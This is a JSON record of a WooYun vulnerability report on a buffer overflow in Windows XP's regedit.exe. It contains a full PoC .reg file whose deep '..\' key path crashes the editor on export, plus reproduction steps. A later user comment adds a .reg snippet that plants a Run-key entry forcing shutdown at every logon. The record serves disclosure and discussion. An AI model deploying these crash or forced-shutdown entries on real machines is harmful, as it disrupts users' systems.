{"id": 4804, "wybug_id": "wooyun-2014-048997", "wybug_title": "Windows XP 注册表编辑器 缓冲区溢出漏洞", "wybug_corp": "Microsoft", "wybug_author": "光刃", "wybug_date": "2014-01-16 11:19", "wybug_open_date": "2014-04-16 11:20", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-16：\t细节向公众公开  简要描述： 漏洞文件regedit.exe版本：5.1.2600.5512测试环境 win xp sp3 详细说明：  \n\n解析问题，导致缓冲区溢出漏洞。poc构造很简单。我是这样构造的。1 随意找一个注册表，打开注册表项搜索Notepad.exe2 找到后 导出来，命名为poc.reg3 在文件路径内加入100H个\"..\\\"4 保存。点击。加入注册表5 打开注册表，找到刚刚新添加的那一项。点击导出。输入文件名。6 这时候regdit.exe就崩溃了。poc.REG信息（将下列文件以文本的形式保存。重命名为poc.REG）\nWindows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\\*\\OpenWithList\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Notepad.exe]\n注意是poc内单斜杠，不是双斜杠奥。   漏洞证明：  \n\n   修复方案：  重写解析代码   版权声明：转载请注明来源 光刃@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-01-21 08:26 厂商回复： 机理有待进一步确认，同时对于版本有效性还需确认。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-16 11:53 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  微软已经被秒杀    \n     2014-01-21 11:06 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  一看标题就猜到是你，毫无悬念    \n     2014-01-26 16:46 |    \t\tRootUser \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:5        | null)\t\t \n  mark    \n     2014-02-10 09:24 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  cert会报给微软？    \n     2014-03-25 18:18 |    \t\tLee Swagger \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:5        | 洗洗睡吧)\t\t \n  Minor,Ignore since it is not common user Case for Enduser    \n     2014-04-16 14:03 |    \t\t悠悠 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:5        | 悠悠~~)\t\t \n  @光刃这个洞，要利用估计还需要进一步调试看看哦。reg export HKEY_CLASSES_ROOT\\*\\OpenWithList a.reg 果真挂了，奇怪的是，竟然导出a.reg成功了。    \n     2014-04-16 17:12 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  不懂汇编的菜鸟来膜拜大牛了    \n     2015-01-17 15:04 |    \t\tAofa \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | check it out yo)\t\t \n  毫无利益的BUG，如果找程序崩溃，哪很容易我每天都崩溃，觉得我说的不妥，你当我小学生不懂高大上好了    \n     2015-02-25 14:57 |    \t\t炮灰乙 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 我叫路人甲，我住在中国)\t\t \n  Windows 注册表编辑器远程命令执行漏洞POCWindows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]muma=cmd.exe /c shutdown -s -t 0    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}